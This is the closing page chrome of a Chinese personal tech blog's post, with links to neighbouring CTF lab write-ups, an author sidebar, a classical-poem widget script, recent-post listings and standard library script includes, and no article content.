+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a></div><div class="post_share"><div class="social-share" data-image="/img/3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/11/CTF/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Time/" title="Time"><img class="cover" src="/img/12.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Time</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/11/CTF/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/" title="Tsclient"><img class="cover" src="/img/3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Tsclient</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/01/11/CTF/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Certify/" title="Certify"><img class="cover" src="/img/15.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-11</div><div class="title">Certify</div></div></a></div><div><a href="/2024/01/11/CTF/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Brute4Road/" title="Brute4Road"><img class="cover" src="/img/14.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-11</div><div class="title">Brute4Road</div></div></a></div><div><a href="/2024/01/11/CTF/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Exchange/" title="Exchange"><img class="cover" src="/img/24.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-11</div><div class="title">Exchange</div></div></a></div><div><a href="/2024/01/11/CTF/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Delegation/" title="Delegation"><img class="cover" src="/img/11.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-11</div><div class="title">Delegation</div></div></a></div><div><a href="/2024/01/11/CTF/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Delivery/" title="Delivery"><img class="cover" src="/img/5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-11</div><div class="title">Delivery</div></div></a></div><div><a href="/2024/01/11/CTF/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Flarum/" title="Flarum"><img class="cover" src="/img/17.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-11</div><div class="title">Flarum</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/18.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">dionysus</div><div class="author-info__description">我醉欲眠卿且去</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MoonlitSyntax"><i class="fab fa-github"></i><span>此心安处</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/img/wechat.png" target="_blank" title="微信"><i class="iconfont  icon-weixin"></i></a><a class="social-icon" href="https://res.abeim.cn/api/qq/?qq=1475856026" target="_blank" title="QQ"><i class="iconfont icon-QQ"></i></a><a class="social-icon" href="https://space.bilibili.com/430091327?spm_id_from=333.1007.0.0" target="_blank" title="bilibili"><i class="iconfont icon-bilibili"></i></a><a class="social-icon" href="mailto:1475856026@qq.com" target="_blank" title="QQ邮箱"><i class="iconfont icon-youxiang"></i></a><a class="social-icon" href="https://chat.openai.com" target="_blank" title="chatgpt"><i class="iconfont icon-ai"></i></a><a class="social-icon" href="https://www.luogu.com.cn" target="_blank" title="洛谷"><i class="iconfont icon-code"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><a class="faa-parent animated-hover"><svg class="faa-tada icon" style="height:25px;width:25px;fill:currentColor;position:relative;top:5px" aria-hidden="true"><use xlink:href="#icon-pinglun-1"></use></svg></a><span>公告</span></div><div class="announcement_content"><script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script> <div id="poem_sentence"></div> <div id="poem_info"></div> <script type="text/javascript">
+  jinrishici.load(function(result) {
+    var sentence = document.querySelector("#poem_sentence")
+    var info = document.querySelector("#poem_info")
+
+    var content = result.data.origin.content;
+
+    // 分割诗句为数组
+    var splitContent = [];
+    content.forEach(line => {
+        var phrases = line.split(/([。，])/);
+        for (var i = 0; i < phrases.length; i += 2) {
+            var phrase = phrases[i];
+            if (i + 1 < phrases.length) {
+                phrase += phrases[i + 1];
+            }
+            splitContent.push(phrase);
+        }
+    });
+
+    // 构建新的诗句
+    var newContent = "";
+    var line = "";
+    for (var i = 0; i < splitContent.length; i++) {
+        if (line.length + splitContent[i].length <= 15) {
+            line += splitContent[i];
+        } else {
+            newContent += line + '<br>';
+            line = splitContent[i];
+        }
+    }
+    newContent += line;
+
+    sentence.innerHTML = newContent;
+    info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》';
+  });
+</script>
+</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/11/%E6%9A%82%E5%AD%98/%E6%9A%82%E5%AD%98%E7%9A%84%E5%86%85%E5%AE%B9/" title="无题"><img src="/img/20.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2025/03/11/%E6%9A%82%E5%AD%98/%E6%9A%82%E5%AD%98%E7%9A%84%E5%86%85%E5%AE%B9/" title="无题">无题</a><time datetime="2025-03-11T03:21:50.350Z" title="发表于 2025-03-11 11:21:50">2025-03-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/11/%E9%9A%8F%E7%AC%94/%E5%8D%9A%E5%AE%A2%E8%BD%AC%E7%A7%BB%E4%BA%86/" title="博客转移了"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="博客转移了"/></a><div class="content"><a class="title" href="/2025/03/11/%E9%9A%8F%E7%AC%94/%E5%8D%9A%E5%AE%A2%E8%BD%AC%E7%A7%BB%E4%BA%86/" title="博客转移了">博客转移了</a><time datetime="2025-03-10T18:54:37.000Z" title="发表于 2025-03-11 02:54:37">2025-03-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/05/%E9%9A%8F%E7%AC%94/3%E6%9C%885%E6%97%A5%E6%9C%89%E6%84%9F/" title="3月5日有感"><img src="/img/20.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="3月5日有感"/></a><div class="content"><a class="title" href="/2025/03/05/%E9%9A%8F%E7%AC%94/3%E6%9C%885%E6%97%A5%E6%9C%89%E6%84%9F/" title="3月5日有感">3月5日有感</a><time datetime="2025-03-04T16:20:33.000Z" title="发表于 2025-03-05 00:20:33">2025-03-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/03/%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/Redis/" title="Redis"><img src="/img/7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redis"/></a><div class="content"><a class="title" href="/2025/03/03/%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/Redis/" title="Redis">Redis</a><time datetime="2025-03-03T13:27:15.000Z" title="发表于 2025-03-03 21:27:15">2025-03-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/03/%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/Mysql/" title="Mysql"><img src="/img/18.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Mysql"/></a><div class="content"><a class="title" href="/2025/03/03/%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/Mysql/" title="Mysql">Mysql</a><time datetime="2025-03-03T13:27:03.000Z" title="发表于 2025-03-03 21:27:03">2025-03-03</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By dionysus</div><div class="footer_custom_text">此心安处是吾乡</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><canvas id="snow"></canvas><script async src="/js/snow.js"></script><script async src="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.js"></script><script async data-pjax src="/js/randombg.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.js"></script><!-- hexo injector body_end end --></body></html>
